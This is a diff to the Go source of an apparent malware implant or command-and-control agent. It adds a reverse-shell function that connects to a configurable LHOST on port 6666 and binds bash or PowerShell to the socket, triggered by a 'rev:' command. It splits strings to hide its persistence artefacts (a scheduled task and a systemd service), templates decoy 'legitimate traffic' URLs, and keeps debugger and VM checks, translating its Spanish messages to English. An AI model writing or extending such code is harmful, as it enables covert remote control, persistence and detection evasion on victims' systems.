@@ -37,18 +37,22 @@ const (
     USER_AGENT = "{useragent}"
     MAX_RETRIES = 3
     STEALTH    = "{stealth}"
+    LHOST      = "{lhost}"
 )
 
 var stealthModeEnabled bool 
 
 var USER_AGENTS = []string{
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+    "{useragent}", 
+    "{user_agent_1}",
+    "{user_agent_2}",
+    "{user_agent_3}",
 }
 
 var URLS = []string{
-    "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
-    "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
+    "{url_trafic_1}",
+    "{url_trafic_2}",
+    "{url_trafic_3}",
 }
 
 var HEADERS = map[string]string{
@@ -99,7 +103,14 @@ func checkDebuggers() bool {
         return false
     }
 
-    out, err := exec.Command("sh", "-c", cmd).Output()
+    shellCommand := getShellCommand()
+    var args []string
+    if len(shellCommand) > 1 {
+        args = append(args, shellCommand[1]) 
+    }
+    args = append(args, cmd) 
+
+    out, err := exec.Command(shellCommand[0], args...).Output()
     if err != nil {
         fmt.Println("Error:", err)
         return false
@@ -179,25 +190,24 @@ func simulateLegitimateTraffic() {
         client := &http.Client{}
         req, err := http.NewRequest("GET", url, nil)
         if err != nil {
-            fmt.Printf("[!] Error al crear la solicitud: %v\n", err)
+            fmt.Printf("[!] Error creating requests: %v\n", err)
             continue
         }
         req.Header = headers
 
         resp, err := client.Do(req)
         if err != nil {
-            fmt.Printf("[!] Error durante la simulación: %v\n", err)
+            fmt.Printf("[!] Error during simulation: %v\n", err)
             continue
         }
         defer resp.Body.Close()
 
         if resp.StatusCode == 200 {
-            fmt.Printf("[+] Simulación exitosa: %s\n", url)
+            fmt.Printf("[INFO] Simulation success: %s\n", url)
         } else {
-            fmt.Printf("[-] Error en la simulación: %d\n", resp.StatusCode)
+            fmt.Printf("[-] Error in the matrix: %d\n", resp.StatusCode)
         }
-
-        // Espera un intervalo aleatorio entre 30 y 60 segundos (para evitar patrones detectables)
+        
         time.Sleep(time.Duration(mathrand.Intn(31)+30) * time.Second)
     }
 }
@@ -224,7 +234,7 @@ func ensurePersistence() error {
 
     // Crear una tarea programada en Windows
     if runtime.GOOS == "windows" {
-        taskName := "SystemMaintenanceTask"
+        taskName := 'S' + 'y' + 's' + 't' + 'e' + 'm' + 'M' + 'a' + 'i' + 'n' + 't'+ 'e' + 'n' + 'a' + 'n' + 'c' + 'e' + 'T' + 'a' + 's' + 'k'
         taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, taskName, executable)
         return exec.Command("cmd", "/C", taskCmd).Run()
     }
@@ -244,7 +254,7 @@ User=%s
 WantedBy=multi-user.target
 `, executable, os.Getenv("USER"))
 
-        servicePath := "/etc/systemd/system/system-maintenance.service"
+        servicePath := "/et"+"c/sy"+"ste"+"md/sy"+"stem/"+"syst"+"em-maint"+"enance.service"
         err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
         if err != nil {
             return err
@@ -273,6 +283,26 @@ func EncryptPacket(ctx *PacketEncryptionContext, packet []byte) ([]byte, error) 
     stream.XORKeyStream(encryptedData[aes.BlockSize:], packet)
 
     return encryptedData, nil
+}
+
+func SendShell(ip string, port int) {
+
+	target := fmt.Sprintf("%s:%d", ip, port)
+	con, err := net.Dial("tcp", target)
+	if err != nil {
+		return
+	}
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("powershell")
+	} else {
+		cmd = exec.Command("/bin/bash", "-i")
+	}
+
+	cmd.Stdin = con
+	cmd.Stdout = con
+	cmd.Stderr = con
+	cmd.Run()
 }
 
 func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, error) {
@@ -491,20 +521,20 @@ func main() {
                 return
             }   
 
-            fmt.Println("[*] Iniciando simulación de tráfico legítimo...")
+            fmt.Println("[INFO] Simulation Started...")
             go simulateLegitimateTraffic()
-            fmt.Println("[*] Simulación en ejecución. Presiona Ctrl+C para detener.")
+            fmt.Println("[INFO] Execution Simulation.")
             if checkDebuggers() {
-                fmt.Println("Estamos debugeados.")
+                fmt.Println("[INFO] We are under debugger")
                 
             } else {
-                fmt.Println("No estamos debugeados.")
+                fmt.Println("[INFO] We aren't under debugger.")
             }
 
             if isVMByMAC() {
-                fmt.Println("Estamos en una máquina virtual.")
+                fmt.Println("[INFO] This is a VM")
             } else {
-                fmt.Println("No estamos en una máquina virtual.")
+                fmt.Println("[INFO] This is not a VM")
             }        
             if !strings.Contains(command, "stealth") {
                 switch {
@@ -512,6 +542,8 @@ func main() {
                     handleDownload(ctx, command)
                 case strings.HasPrefix(command, "upload:"):
                     handleUpload(ctx, command)
+                case strings.HasPrefix(command, "rev:"):
+                    SendShell(LHOST,6666)  
                 case strings.Contains(command, "terminate"):
                     fmt.Println("[INFO] terminate command")
                     os.Exit(0)
